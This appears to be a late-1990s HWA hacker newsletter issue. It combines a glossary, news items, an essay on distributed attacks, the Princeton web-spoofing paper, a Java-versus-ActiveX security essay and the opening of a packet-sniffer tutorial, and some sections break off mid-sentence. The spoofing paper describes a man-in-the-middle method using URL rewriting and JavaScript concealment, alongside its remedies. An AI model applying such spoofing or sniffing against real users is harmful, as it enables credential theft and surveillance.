   Synopsis 
   ---------
   
   The purpose of this newsletter is to 'digest' current events of interest
   that affect the online underground and netizens in general. This includes
   coverage of general security issues, hacks, exploits, underground news
   and anything else I think is worthy of a look see. (remember i'm doing
   this for me, not you, the fact some people happen to get a kick/use
   out of it is of secondary importance).

    This list is NOT meant as a replacement for, nor to compete with, the
   likes of publications such as CuD or PHRACK or with news sites such as
   AntiOnline, the Hacker News Network (HNN) or mailing lists such as
   BUGTRAQ or ISN nor could any other 'digest' of this type do so.

    It *is* intended  however, to  compliment such material and provide a
   reference to those who follow the culture by keeping tabs on as many
   sources as possible and providing links to further info, its a labour
   of love and will be continued for as long as I feel like it, i'm not
   motivated by dollars or the illusion of fame, did you ever notice how
   the most famous/infamous hackers are the ones that get caught? there's
   a lot to be said for remaining just outside the circle... <g>

    WANTED!: POSTCARDS! YESH! POSTCARDS, I COLLECT EM so I know a lot of you are
    ~~~~~~~  reading this from some interesting places, make my day and get a
             mention in the zine, send in a postcard, I realize that some places
             it is cost prohibitive but if you have the time and money be a cool
             dude / gal and send a poor guy a postcard preferably one that has some
             scenery from your place of residence for my collection, I collect stamps
             too so you kill two birds with one stone by being cool and mailing in a
             postcard, return address not necessary, just a  "hey guys being cool in
             Bahrain, take it easy" will do ... ;-) thanx.



    Ideas for interesting 'stuff' to send in apart from news:

    - Photo copies of old system manual front pages (optionally signed by you) ;-)
    - Photos of yourself, your mom, sister, dog and or cat in a NON
      compromising position plz I don't want pr0n. <g>
    - Picture postcards
    - CD's 3.5" disks, Zip disks, 5.25" or 8" floppies, Qic40/80/100-250
      tapes with hack/security related archives, logs, irc logs etc on em.
    - audio or video cassettes of yourself/others etc of interesting phone
      fun or social engineering examples or transcripts thereof.

    If you still can't think of anything you're probably not that interesting
    a person after all so don't worry about it <BeG>

    About the Bugtraq mailing list
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    The following comes from Bugtraq's info file:

    This list is for *detailed* discussion of UNIX security holes: what they are,
    how to exploit, and what to do to fix them.

    This list is not intended to be about cracking systems or exploiting their
    vulnerabilities. It is about defining, recognizing, and preventing use of
    security holes and risks.

    Please refrain from posting one-line messages or messages that do not contain
    any substance that can relate to this list`s charter.

    I will allow certain informational posts regarding updates to security tools,
    documents, etc. But I will not tolerate any unnecessary or nonessential "noise"
    on this list.

    Please follow the below guidelines on what kind of information should be posted
    to the Bugtraq list:

    + Information on Unix related security holes/backdoors (past and present)
    + Exploit programs, scripts or detailed processes about the above
    + Patches, workarounds, fixes
    + Announcements, advisories or warnings
    + Ideas, future plans or current works dealing with Unix security
    + Information material regarding vendor contacts and procedures
    + Individual experiences in dealing with above vendors or security organizations
    + Incident advisories or informational reporting

    Any non-essential replies should not be directed to the list but to the originator of the message. Please do not "CC" the bugtraq
    reflector address if the response does not meet the above criteria.

      Well what does HWA stand for? never mind if you ever find out I may
     have to get those hax0rs from 'Hackers' or the Pretorians after you.

     In case you couldn't figure it out hax0r is "new skewl" and although
     it is laughed at, shunned, or even pidgeon holed with those 'dumb
     leet (l33t?) dewds' <see article in issue #4> this is the state
     of affairs. It ain't Stephen Levy's HACKERS anymore. BTW to all you
     up  and comers, i'd highly recommend you get that book. Its almost

  00.5  HWA FAQ v1.0 Feb 13th 1999 (Abridged & slightly updated again)
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Also released in issue #3. (revised) check that issue for the faq
    it won't be reprinted unless changed in a big way with the exception
    of the following excerpt from the FAQ, included to assist first time
    readers:

    Some of the stuff related to personal useage and use in this zine are
    listed below: Some are very useful, others attempt to deny the any possible
    attempts at eschewing obfuscation by obsucuring their actual definitions.

    @HWA   - see EoA  ;-)

    !=     - Mathematical notation "is not equal to" or "does not equal"
             ASC(247)  "wavey equals" sign means "almost equal" to. If written
             an =/= (equals sign with a slash thru it) also means !=, =< is Equal
             to or less than and =>  is equal to or greater than (etc, this aint
             fucking grade school, cripes, don't believe I just typed all that..)

    AAM    - Ask a minor (someone under age of adulthood, usually <16, <18 or <21)

    AOL    - A great deal of people that got ripped off for net access by a huge
             clueless isp with sekurity that you can drive buses through, we're
             not talking Kung-Fu being none too good here, Buy-A-Kloo maybe at the
             least they could try leasing one??

   *CC     - 1 - Credit Card (as in phraud)
             2 - .cc is COCOS (Keeling) ISLANDS butthey probably accept cc's

    CCC    - Chaos Computer Club (Germany)

             not least, get drunk.
   *CRACKER - 1 . Someone who cracks games, encryption or codes, in popular hacker
                 speak he's the guy that breaks into systems and is often (but by no
                 means always) a "script kiddie" see pheer
              2 . An edible biscuit usually crappy tasting without a nice dip, I like
                  jalapeno pepper dip or chives sour cream and onion, yum - Ed

   *HAX0R - 1 - Cracker, hacker wannabe, in some cases a true hacker, this is difficult to
            define, I think it is best defined as pop culture's view on The Hacker ala

     ++  nmap v2.12 is out! "nmap is a utility for port scanning large networks,
         although it works fine for single hosts. The guiding philosophy for the
         creation of nmap was TMTOWTDI (There's More Than One Way To Do It). This is 
         the Perl slogan, but it is equally applicable to scanners. Sometimes you need
         speed, other times you may need stealth. In some cases, bypassing firewalls 
         may be required. Not to mention the fact that you may want to scan different
         protocols (UDP, TCP, ICMP, etc.). You just can't do all this with one scanning
         mode. And you don't want to have 10 different scanners around, all with different
         interfaces and capabilities. Thus I [Fyodor] incorporated virtually every scanning
         technique I [Fyodor] know into nmap. Specifically, nmap supports: Vanilla TCP 
         connect() scanning, TCP SYN (half open) scanning, TCP FIN, Xmas, or NULL (stealth)
         scanning, TCP ftp proxy (bounce attack) scanning, SYN/FIN scanning using IP 
         fragments (bypasses packet filters), UDP raw ICMP port unreachable scanning, ICMP
         scanning (ping-sweep), TCP Ping scanning, Remote OS Identification by TCP/IP 
         Fingerprinting, and Reverse-ident scanning. nmap also supports a number of 
         performance and reliability features such as dynamic delay time calculations, 
         packet timeout and retransmission, parallel port scanning, detection of down hosts
         via parallel pings. Nmap also offers flexible target and port specification, decoy
         scanning, determination of TCP sequence predictability characteristics, and output
         to machine parseable or human readable log files." --  Fyodor. Changes: -sT now uses 
         a different method to determine the results of a non-blocking connect() call 
         (makes nmap more portable), got rid of the security warning message for people who 
         are missing /dev/random and /dev/urandom due to complaints about the warning (note:
         This only silences the warnings -- it still uses relatively weak random number 
         generation under Solaris and other systems that lack this functionality), eliminated
         pow() calls on Linux boxes to rectify a SIGSEGV condition, fixed an rpm problem.

     ++ This patch sets the tos field for IP headers to high priority and
        optimizes the IP connection for throughput, which has real effects on
        cisco routers.
        Since it is bad policy and if hundrets of lamers use it I wont like it.
        But I even more dislike hidden information, I'll let you decide wether
        to publish it, but if you decide to do it, please do it anonymously.

     ++ KeyPost to close

        Australia Post is set to close down its KeyPost digital certificate
        issuing authority, citing poor returns and a lower than expected 
        takeup. The closure is expected to take effect on August 1. KeyPost
        was Australia's first commercial digital certificate authority (CA).
        It kicked off operations in Victoria nearly two years ago, followed 
        by a nationwide rollout six months later. An Australia Post spokes
        person told Newswire this afternoon that ditching KeyPost was a 
        commercial decision. "The takeup was lower than expected, and we had
        anticipated greater interest from all areas of government," the 
        spokesperson said.

 03.0 Why Business Fears Distributed Attacks
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
      From buffer overflow (HNN) http://www.hackernews.com/orig/fear.html

       By: B. Houston
  
       For years, in the security industry, analysts have been spreading the anxiety of massive distributed attacks
       against sites. They have described to clients the possiblity of a similtaneous, parallel system attack pulled
       off with military like precision. To many, it looks like that day has actually arrived. During the recent attacks on the
       Pentagon, many people in the media were eluding to everything from third-world military and terrorist
       organizations to a single "script kiddie" playing with some new toys. The real truth, however, is that all these things
       may be the case, or none of them. In the Pentagon incident we have press releases, media gossip and tons of
       hype but the one thing we don't have is the truth. Out of the whole scenario, the only things we know for sure are
       that there will be more fear and more attacks. 
  
       The problems demonstrated by the distributed attack scenario are many. First, you have the basic concept of a
       large group of system crackers attacking one system with many resources, an immense amount of bandwidth and a
       cooperative mind. System administrators, and their corporate bosses, already fear break-in's so a chance of a
       massive scale penetration is a natural sleep thief for them. Secondly, many administrators feel that they may be able
       to defend their systems against a lone attacker, but few believe that they could defeat an entire legion of system
       attacks across a broad band of hosts. Many feel that their current firewalls, intrusion detection systems and logging
       tools will be less effective against logically grouped attacks existing just under the delicate thereshold that
       these systems monitor. In addition, you have the extended probability that a high visibility attack may
       simply be the smokescreen or time-wasting bait used to cover a more dangerous and thorough attack elsewhere
       on the network. Lastly, and certainly not least, security adminsitrators are alarmed at the growing availability and
       granularity of the underground knowledgebase available on the Internet. New exploits are being discovered, coded,
       quantified, explained and canonized on web sites around the world at an alarming pace. 
  
       System administrators have begun to report an increase in advanced probes, port scans and specific vulnerability
       tests from the Internet. New tools available in the underground, and the increase of both raw computing
       power and low level operating systems have made this situation even more apparent. More and more underground
       users have made the switch to Linux and other free Unix based OS derivatives creating a more technical and
       programming savvy band of hackers. Or at least that is what many security experts are claiming. 
  
       On the other hand these same new tools and bandwidth excesses make deception by the underground even easier
       than a massive attack. Many of the new tools are capable of using address spoofing, parallel scanning and other
       technologies that make even a simple port scan appear to be a "massive ditributed attack". Sites are being recorded
       and published that offer access for attack pass-throughs and these are growing in number everyday as new users
       expand home networks into Internet space via cable modems and ADSL. And yes, the membersof the
       underground have taken notice. 
  
       The bottom line is that business and other organizations do indeed need to fear massive distributed penetration
       attempts. These types of attacks are certainly become more possible and perhaps even probable, though a
       paniced reaction certainly needs to be avoided at all costs. As always, things may not appear to be as they
       are. The key here is to read, study and become familiar with the tools and protections available to you. And yes,
       a few tests are probably in order...

       Introduction
       
       This paper describes an Internet security attack that could endanger the privacy of World Wide Web users and the integrity of their data. The attack can be carried
       out on today's systems, endangering users of the most common Web browsers, including Netscape Navigator and Microsoft Internet Explorer. 
       
       Web spoofing allows an attacker to create a "shadow copy" of the entire World Wide Web. Accesses to the shadow Web are funneled through the attacker's
       machine, allowing the attacker to monitor the all of the victim's activities including any passwords or account numbers the victim enters. The attacker can also cause
       false or misleading data to be sent to Web servers in the victim's name, or to the victim in the name of any Web server. In short, the attacker observes and controls
       everything the victim does on the Web. 
       
       We have implemented a demonstration version of this attack. 
       
       Spoofing Attacks
       
       In a spoofing attack, the attacker creates misleading context in order to trick the victim into making an inappropriate security-relevant decision. A spoofing attack is
       like a con game: the attacker sets up a false but convincing world around the victim. The victim does something that would be appropriate if the false world were
       real. Unfortunately, activities that seem reasonable in the false world may have disastrous effects in the real world. 
       
       Spoofing attacks are possible in the physical world as well as the electronic one. For example, there have been several incidents in which criminals set up bogus
       automated-teller machines, typically in the public areas of shopping malls [1]. The machines would accept ATM cards and ask the person to enter their PIN code.
       Once the machine had the victim's PIN, it could either eat the card or "malfunction" and return the card. In either case, the criminals had enough information to copy
       the victim's card and use the duplicate. In these attacks, people were fooled by the context they saw: the location of the machines, their size and weight, the way they
       were decorated, and the appearance of their electronic displays. 
       
       People using computer systems often make security-relevant decisions based on contextual cues they see. For example, you might decide to type in your bank
       account number because you believe you are visiting your bank's Web page. This belief might arise because the page has a familiar look, because the bank's URL
       appears in the browser's location line, or for some other reason. 
       
       To appreciate the range and severity of possible spoofing attacks, we must look more deeply into two parts of the definition of spoofing: security-relevant decisions
       and context. 
       
       Security-relevant Decisions
       
       By "security-relevant decision," we mean any decision a person makes that might lead to undesirable results such as a breach of privacy or unauthorized tampering
       with data. Deciding to divulge sensitive information, for example by typing in a password or account number, is one example of a security-relevant decision.
       Choosing to accept a downloaded document is a security-relevant decision, since in many cases a downloaded document is capable of containing malicious elements
       that harm the person receiving the document [2]. 
       
       Even the decision to accept the accuracy of information displayed by your computer can be security-relevant. For example, if you decide to buy a stock based on
       information you get from an online stock ticker, you are trusting that the information provided by the ticker is correct. If somebody could present you with incorrect
       stock prices, they might cause you to engage in a transaction that you would not have otherwise made, and this could cost you money. 
       
       Context 
       
       A browser presents many types of context that users might rely on to make decisions. The text and pictures on a Web page might give some impression about where
       the page came from; for example, the presence of a corporate logo implies that the page originated at a certain corporation. 
       
       The appearance of an object might convey a certain impression; for example, neon green text on a purple background probably came from Wired magazine. You
       might think you're dealing with a popup window when what you are seeing is really just a rectangle with a border and a color different from the surrounding parts of
       the screen. Particular graphical items like file-open dialog boxes are immediately recognized as having a certain purpose. Experienced Web users react to such cues
       in the same way that experienced drivers react to stop signs without reading them. 
       
       The names of objects can convey context. People often deduce what is in a file by its name. Is manual.doc the text of a user manual? (It might be another kind of
       document, or it might not be a document at all.) URLs are another example. Is MICR0S0FT.COM the address of a large software company? (For a while that address
       pointed to someone else entirely. By the way, the round symbols in MICR0S0FT here are the number zero, not the letter O.) Was dole96.org Bob Dole's 1996
       presidential campaign? (It was not; it pointed to a parody site.) 
       
       People often get context from the timing of events. If two things happen at the same time, you naturally think they are related. If you click over to your bank's page
       and a username/password dialog box appears, you naturally assume that you should type the name and password that you use for the bank. If you click on a link
       and a document immediately starts downloading, you assume that the document came from the site whose link you clicked on. Either assumption could be wrong. 
       
       If you only see one browser window when an event occurs, you might not realize that the event was caused by another window hiding behind the visible one. 
       
       Modern user-interface designers spend their time trying to devise contextual cues that will guide people to behave appropriately, even if they do not explicitly notice
       the cues. While this is usually beneficial, it can become dangerous when people are accustomed to relying on context that is not always correct. 
       
       TCP and DNS Spoofing
       
       Another class of spoofing attack, which we will not discuss here, tricks the user's software into an inappropriate action by presenting misleading information to that
       software [3]. Examples of such attacks include TCP spoofing [4], in which Internet packets are sent with forged return addresses, and DNS spoofing [5], in which
       the attacker forges information about which machine names correspond to which network addresses. These other spoofing attacks are well known, so we will not
       discuss them further. 
       
       Web Spoofing
       
       Web spoofing is a kind of electronic con game in which the attacker creates a convincing but false copy of the entire World Wide Web. The false Web looks just
       like the real one: it has all the same pages and links. However, the attacker controls the false Web, so that all network traffic between the victim's browser and the
       Web goes through the attacker. 
       
       Consequences
       
       Since the attacker can observe or modify any data going from the victim to Web servers, as well as controlling all return traffic from Web servers to the victim, the
       attacker has many possibilities. These include surveillance and tampering. 
       
       Surveillance The attacker can passively watch the traffic, recording which pages the victim visits and the contents of those pages. When the victim fills out a form,
       the entered data is transmitted to a Web server, so the attacker can record that too, along with the response sent back by the server. Since most on-line commerce
       is done via forms, this means the attacker can observe any account numbers or passwords the victim enters. 
       
       As we will see below, the attacker can carry out surveillance even if the victim has a "secure" connection (usually via Secure Sockets Layer) to the server, that is,
       even if the victim's browser shows the secure-connection icon (usually an image of a lock or a key). 
       
       Tampering The attacker is also free to modify any of the data traveling in either direction between the victim and the Web. The attacker can modify form data
       submitted by the victim. For example, if the victim is ordering a product on-line, the attacker can change the product number, the quantity, or the ship-to address. 
       
       The attacker can also modify the data returned by a Web server, for example by inserting misleading or offensive material in order to trick the victim or to cause
       antagonism between the victim and the server. 
       
       Spoofing the Whole Web
       
       You may think it is difficult for the attacker to spoof the entire World Wide Web, but it is not. The attacker need not store the entire contents of the Web. The whole
       Web is available on-line; the attacker's server can just fetch a page from the real Web when it needs to provide a copy of the page on the false Web. 
       
       How the Attack Works
       
       The key to this attack is for the attacker's Web server to sit between the victim and the rest of the Web. This kind of arrangement is called a "man in the middle
       attack" in the security literature. 
       
       URL Rewriting
       
       The attacker's first trick is to rewrite all of the URLs on some Web page so that they point to the attacker's server rather than to some real server. Assuming the
       attacker's server is on the machine www.attacker.org, the attacker rewrites a URL by adding http://www.attacker.org to the front of the URL. For example,
       http://home.netscape.com becomes http://www.attacker.org/http://home.netscape.com. (The URL rewriting technique has been used for other
       reasons by two other Web sites, the Anonymizer and the Zippy filter. See page 9 for details.) 
       
       Figure 1 shows what happens when the victim requests a page through one of the rewritten URLs. The victim's browser requests the page from
       www.attacker.org, since the URL starts with http://www.attacker.org. The remainder of the URL tells the attacker's server where on the Web to go to get
       the real document.
       
       
       
       
       
       
       Figure 1: An example Web transaction during a Web spoofing attack. The victim requests a Web page. The following steps occur: (1) the victim's browser requests
       the page from the attacker's server; (2) the attacker's server requests the page from the real server; (3) the real server provides the page to the attacker's server; (4)
       the attacker's server rewrites the page; (5) the attacker's server provides the rewritten version to the victim. 
       
       
       
       Once the attacker's server has fetched the real document needed to satisfy the request, the attacker rewrites all of the URLs in the document into the same special
       form by splicing http://www.attacker.org/ onto the front. Then the attacker's server provides the rewritten page to the victim's browser. 
       
       Since all of the URLs in the rewritten page now point to www.attacker.org, if the victim follows a link on the new page, the page will again be fetched through the
       attacker's server. The victim remains trapped in the attacker's false Web, and can follow links forever without leaving it. 
       
       Forms
       
       If the victim fills out a form on a page in a false Web, the result appears to be handled properly. Spoofing of forms works naturally because forms are integrated
       closely into the basic Web protocols: form submissions are encoded in URLs and the replies are ordinary HTML Since any URL can be spoofed, forms can also be
       spoofed. 
       
       When the victim submits a form, the submitted data goes to the attacker's server. The attacker's server can observe and even modify the submitted data, doing
       whatever malicious editing desired, before passing it on to the real server. The attacker's server can also modify the data returned in response to the form submission.
       
       "Secure" connections don't help
       
       One distressing property of this attack is that it works even when the victim requests a page via a "secure" connection. If the victim does a "secure" Web access ( a
       Web access using the Secure Sockets Layer) in a false Web, everything will appear normal: the page will be delivered, and the secure connection indicator (usually
       an image of a lock or key) will be turned on. 
       
       The victim's browser says it has a secure connection because it does have one. Unfortunately the secure connection is to www.attacker.org and not to the place
       the victim thinks it is. The victim's browser thinks everything is fine: it was told to access a URL at www.attacker.org so it made a secure connection to
       www.attacker.org. The secure-connection indicator only gives the victim a false sense of security. 
       
       Starting the Attack
       
       To start an attack, the attacker must somehow lure the victim into the attacker's false Web. There are several ways to do this. An attacker could put a link to a false
       Web onto a popular Web page. If the victim is using Web-enabled email, the attacker could email the victim a pointer to a false Web, or even the contents of a page
       in a false Web. Finally, the attacker could trick a Web search engine into indexing part of a false Web. 
       
       Completing the Illusion
       
       The attack as described thus far is fairly effective, but it is not perfect. There is still some remaining context that can give the victim clues that the attack is going on.
       However, it is possible for the attacker to eliminate virtually all of the remaining clues of the attack's existence. 
       
       Such evidence is not too hard to eliminate because browsers are very customizable. The ability of a Web page to control browser behavior is often desirable, but
       when the page is hostile it can be dangerous. 
       
       The Status Line
       
       The status line is a single line of text at the bottom of the browser window that displays various messages, typically about the status of pending Web transfers. 
       
       The attack as described so far leaves two kinds of evidence on the status line. First, when the mouse is held over a Web link, the status line displays the URL the link
       points to. Thus, the victim might notice that a URL has been rewritten. Second, when a page is being fetched, the status line briefly displays the name of the server
       being contacted. Thus, the victim might notice that www.attacker.org is displayed when some other name was expected. 
       
       The attacker can cover up both of these cues by adding a JavaScript program to every rewritten page. Since JavaScript programs can write to the status line, and
       since it is possible to bind JavaScript actions to the relevant events, the attacker can arrange things so that the status line participates in the con game, always
       showing the victim what would have been on the status line in the real Web. Thus the spoofed context becomes even more convincing. 
       
       The Location Line
       
       The browser's location line displays the URL of the page currently being shown. The victim can also type a URL into the location line, sending the browser to that
       URL. The attack as described so far causes a rewritten URL to appear in the location line, giving the victim a possible indication that an attack is in progress. 
       
       This clue can be hidden using JavaScript. A JavaScript program can hide the real location line and replace it by a fake location line which looks right and is in the
       expected place. The fake location line can show the URL the victim expects to see. The fake location line can also accept keyboard input, allowing the victim to type
       in URLs normally. Typed-in URLs can be rewritten by the JavaScript program before being accessed. 
       
       Viewing the Document Source
       
       There is one clue that the attacker cannot eliminate, but it is very unlikely to be noticed. 
       
       By using the browser's "view source" feature, the victim can look at the HTML source for the currently displayed page. By looking for rewritten URLs in the HTML
       source, the victim can spot the attack. Unfortunately, HTML source is hard for novice users to read, and very few Web surfers bother to look at the HTML source
       for documents they are visiting, so this provides very little protection. 
       
       A related clue is available if the victim chooses the browser's "view document information" menu item. This will display information including the document's real
       URL, possibly allowing the victim to notice the attack. As above, this option is almost never used so it is very unlikely that it will provide much protection. 
       
       Bookmarks
       
       There are several ways the victim might accidentally leave the attacker's false Web during the attack. Accessing a bookmark or jumping to a URL by using the
       browser's "Open location" menu item might lead the victim back into the real Web. The victim might then reenter the false Web by clicking the "Back" button. We
       can imagine that the victim might wander in and out of one or more false Webs. Of course, bookmarks can also work against the victim, since it is possible to
       bookmark a page in a false Web. Jumping to such a bookmark would lead the victim into a false Web again. 
       
       Tracing the Attacker
       
       Some people have suggested that this attack can be deterred by finding and punishing the attacker. It is true that the attacker's server must reveal its location in order
       to carry out the attack, and that evidence of that location will almost certainly be available after an attack is detected. 
       
       Unfortunately, this will not help much in practice because attackers will break into the machine of some innocent person and launch the attack there. Stolen machines
       will be used in these attacks for the same reason most bank robbers make their getaways in stolen cars. 
       
       Remedies
       
       Web spoofing is a dangerous and nearly undetectable security attack that can be carried out on today's Internet. Fortunately there are some protective measures you
       can take. 
       
       Short-term Solution
       
       In the short run, the best defense is to follow a three-part strategy: 
       
          1.disable JavaScript in your browser so the attacker will be unable to hide the evidence of the attack; 
          2.make sure your browser's location line is always visible; 
          3.pay attention to the URLs displayed on your browser's location line, making sure they always point to the server you think you're connected to. 
       
       This strategy will significantly lower the risk of attack, though you could still be victimized if you are not conscientious about watching the location line. 
       
       At present, JavaScript, ActiveX, and Java all tend to facilitate spoofing and other security attacks, so we recommend that you disable them. Doing so will cause you
       to lose some useful functionality, but you can recoup much of this loss by selectively turning on these features when you visit a trusted site that requires them. 
       
       Long-term Solution
       
       We do not know of a fully satisfactory long-term solution to this problem. 
       
       Changing browsers so they always display the location line would help, although users would still have to be vigilant and know how to recognize rewritten URLs. 
       
       For pages that are not fetched via a secure connection, there is not much more that can be done. 
       
       For pages fetched via a secure connection, an improved secure-connection indicator could help. Rather than simply indicating a secure connection, browsers should
       clearly say who is at the other end of the connection. This information should be displayed in plain language, in a manner intelligible to novice users; it should say
       something like "Microsoft Inc." rather than "www.microsoft.com." 
       
       Every approach to this problem seems to rely on the vigilance of Web users. Whether we can realistically expect everyone to be vigilant all of the time is debatable. 
       
       Related Work
       
       We did not invent the URL rewriting technique. Previously, URL rewriting has been used as a technique for providing useful services to people who have asked for
       them. 
       
       We know of two existing services that use URL rewriting. The Anonymizer, written by Justin Boyan at Carnegie Mellon University, is a service that allows users to
       surf the Web without revealing their identities to the sites they visit. The Zippy filter, written by Henry Minsky, presents an amusing vision of the Web with
       Zippy-the-Pinhead sayings inserted at random. 
       
       Though we did not invent URL rewriting, we believe we are the first to realize its full potential as one component of a security attack.

       Security Tradeoffs: Java vs. ActiveX

       An Unofficial View from the Princeton Secure Internet Programming Team

         + What are Java and ActiveX?
       
       Java and ActiveX are two systems that let people attach computer programs to Web pages. People like these systems because they allow Web
       pages to be much more dynamic and interactive than they could be otherwise. 
       
       However, Java and ActiveX do introduce some security risk, because they can cause potentially hostile programs to be automatically
       downloaded and run on your computer, just because you visited some Web page. The downloaded program could try to access or damage the
       data on your machine, for example to insert a virus. Both Java and ActiveX take measures to protect your from this risk. 
       
       There has been a lot of public debate over which system offers better security. This page gives our opinion on this debate. Java and ActiveX
       take fundamentally different approaches to security. We will concentrate on comparing the approaches, rather than critiquing the details of the
       two systems. After all, details can be fixed. 
       
        +  Who are the players?
       
       Java was developed by JavaSoft, a division of Sun Microsystems. Java is supported by both of the major browsers, Netscape Navigator and
       Microsoft Internet Explorer. 
       
       ActiveX was developed by Microsoft. It is supported in Microsoft's Internet Explorer, and an ActiveX plug-in is available for Netscape Navigator. 
       
       The most intense public debate about security has been between JavaSoft and Microsoft. Each company has accused the other of being
       careless about security, and some misleading charges have been made. 
       
        +  How does security work in ActiveX?
       
       ActiveX security relies entirely on human judgement. ActiveX programs come with digital signatures from the author of the program and anybody
       else who chooses to endorse the program. 
       
       Think of a digital signature as being like a person's signature on paper. Your browser can look at a digital signature and see whether it is
       genuine, so you can know for sure who signed a program. (That's the theory, at least. Things don't always work out so neatly in practice.) 
       
       Once your browser has verified the signatures, it tells you who signed the program and asks you whether or not to run it. You have two choices:
       either accept the program and let it do whatever it wants on your machine, or reject it completely. 
       
       ActiveX security relies on you to make correct decisions about which programs to accept. If you accept a malicious program, you are in big
       trouble. 
       
        +  How does security work in Java?
       
       Java security relies entirely on software technology. Java accepts all downloaded programs and runs them within a security "sandbox". Think of
       the sandbox as a security fence that surrounds the program and keeps it away from your private data. As long as there are no holes in the fence,
       you are safe. 
       
       Java security relies on the software implementing the sandbox to work correctly. 
       
        +  How can ActiveX security break down?
       
       The main danger in ActiveX is that you will make the wrong decision about whether to accept a program. One way this can happen is that some
       person you trust turns out not to deserve that trust. 
       
       The most dangerous situation, though, is when the program is signed by someone you don't know anything about. You'd really like to see what
       this program does, but if you reject it you won't be able to see anything. So you rationalize: the odds that this particular program is hostile are
       very small, so why not go ahead and accept it? After all, you accepted three programs yesterday and nothing went wrong. It's just human nature
       to accept the program. 
       
       Even if the risk of accepting one program is low, the risk adds up when you repeatedly accept programs. And when you do get the one bad
       program, there is no limit on how much damage it can do. 
       
       The only way to avoid this scenario is to refuse all programs, no matter how fun or interesting they sound, except programs that come from a few
       people you know well. Who has the self-discipline to do that? 
       
        +  How can Java security break down?
       
       The main danger in Java comes from the complexity of the software that implements the sandbox. Common sense says that complicated
       technology is more likely to break down than simple technology. Java is pretty complicated, and several breakdowns have happened in the past.
       
       If you're the average person, you don't have the time or the desire to examine Java and look for implementation errors. So you have to hope the
       implementers did everything right. They're smart and experienced and motivated, but that doesn't make them infallible. 
       
       When Java security does break down, the potential consequences are just as bad as those of an ActiveX problem: a hostile program can come
       to your machine and access your data at will. 
       
        +  What about "signed applets" in Java?
       
       One problem with the original version of Java is that the "sandbox" can be too restrictive. For example, Java programs are not allowed to
       access files, so there's no way to write a text editor. (What good is editing if you can't save your work?) 
       
       Java-enabled products are now starting to use digital signatures to work around this problem. The idea is like ActiveX: programs are digitally
       signed and you can decide, based on the signature, to give a program more power than it would otherwise have. This lets you run a text editor
       program if you decide that you trust its author. 
       
       The downside of this scheme is that it introduces some of the ActiveX problems. If you make the wrong decision about who to trust, you could be
       very sorry. There's no known way to get around this dilemma. Some kinds of programs must be given power in order to be useful, and there's no
       ironclad guarantee that those programs will be well-behaved. 
       
       Still, Java with signed applets does offer some advantages over ActiveX. You can put only partial trust in a program, while ActiveX requires
       either full trust or no trust at all. And a Java-enabled browser could keep a record of which dangerous operations are carried out by each trusted
       program, so it would be easier to reconstruct what happened if anything went wrong. (Current browsers don't do this record-keeping, but we
       wish they would.) Finally, Java offers better protection against accidental damage caused by buggy programs. 
       
        +  What about plug-ins?
       
       Plug-ins are a method for adding code to your browser. Plug-ins have the same security model as ActiveX: when you download a plug-in, you
       are trusting it to be harmless. All of the warnings about ActiveX programs apply to plug-ins too. 
       
        +  Can I be hurt by a "good" plug-in or ActiveX program?
       
       Unfortunately, yes. This depends entirely on what the plug-in or program does. Many plug-ins such as Macromedia's Shockwave or Sun's
       Safe-Tcl are actually completely general programming systems, just like Java. By accepting a plug-in like this, you're trusting that the plug-in
       program has no security-relevant bugs. As we have seen with Java, systems that are meant to be secure often have bugs that lead to security
       problems. 
       
       With ActiveX, this problem is made worse if you click the box which accepts all programs signed by the same person (for example, if you accept
       anything signed by Microsoft). While one Microsoft program may be secure, another one may have a security-relevant bug. 
       
       This problem even applies to code written by your own company for internal use. Once the plug-in or program is installed in your browser, an
       external attacker (who knew about the program) could write a Web page which used your internal program bug passed it funny data which
       corrupted the program and took over your machine. 
       
       If you're feeling paranoid, the only plug-ins you should allow are those with less than general purpose functionality. A plug-in which handles a new
       image, video, or audio format is less likely to be exploitable than a plug-in for a completely general animation system. 
       
        +  This sounds pretty scary. How worried should I be?
       
       The good news is that there have been few incidents of people being damaged by hostile Java or ActiveX programs. The reason is simply that
       the people with the skills to create malicious programs have chosen not to do so. 
       
       For most people, continuing to use Java and ActiveX is the right choice. If you are informed about the risks, you can make a rational decision to
       accept some danger in exchange for the benefits of using Java and ActiveX. 
       
        +   How can I lower my risk?
       
       There are several things you can do. 
       
        +   Think very carefully before accepting a digitally signed program. How competent and trustworthy is the signer? 
            Use up-to-date browser versions, and install the security patches offered by your browser vendor. 
            Never surf the Web on a computer that contains highly sensitive information like medical records.

 08.0  Building a packet sniffer from the ground up Part I
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
                          Basic Packet-Sniffer Construction
                                  from the Ground Up

                                       Part 1
                                         by

                                     Chad Renfro

          Packet sniffers are applications used by network administrators to monitor and
       validate network traffic. Sniffers are programs used to read packets that travel across 
       the network at various levels of the OSI layer. And like most security tools sniffers too
       can be used for both good and destructive purposes. On the light-side of network
       administration sniffers help quickly track down problems such as bottlenecks and
       misplaced filters. However on the dark-side sniffers can be used to reap tremendous
       amounts of havoc by gathering legitimate user names and passwords so that other
       machines can be quickly compromised. Hopefully this paper will be used to help
       administrators gain control of their networks by being able to analyze network traffic 
       not only by using preconstructed  sniffers but by being able to create their own. This
       paper will look at the packet sniffer from the bottem up, looking in depth at the sniffer
       core and then gradualy adding functionality to the application. The example included
       here will help illustrate some rather cumbersome issues when dealing with network
       programing. In no way will this single paper teach a person to write a complete sniffing
       application like tcpdump or sniffit. It will however teach some very fundamental issues
       that are inherent to all packet sniffers. Like how the packets are accessed on the network
       and how to work with the packets at different layers.
       
       
       
       
       
       
       
       
       The most basic sniffer...
       
       Sniffer #1.
       
          This sniffer will illustrate the use of the  SOCK_RAW device and show how to gather
       packets from the network and print out some simple header  information to std_out.
       Although the basic premise is that packet sniffers operate  in a promiscuous mode which
       listens to all packets weather or not the packet is destined  for the machines mac address,
       this example will collect packets in a non-promiscuous mode . This will let usconcentrate
       on the SOCK_RAW device for the first example. To operate this same  code  in a
       promiscous mode  the network card may be put in a promiscous mode manually. To do
       this type this in after the log in :
       
       
          > su -
          Password : ********
          # ifconfig eth0 promisc
       
          This will now set the network interface eth0 in promiscous mode.

             Before we go any further two topics should be covered,byte-ordering and sockaddr
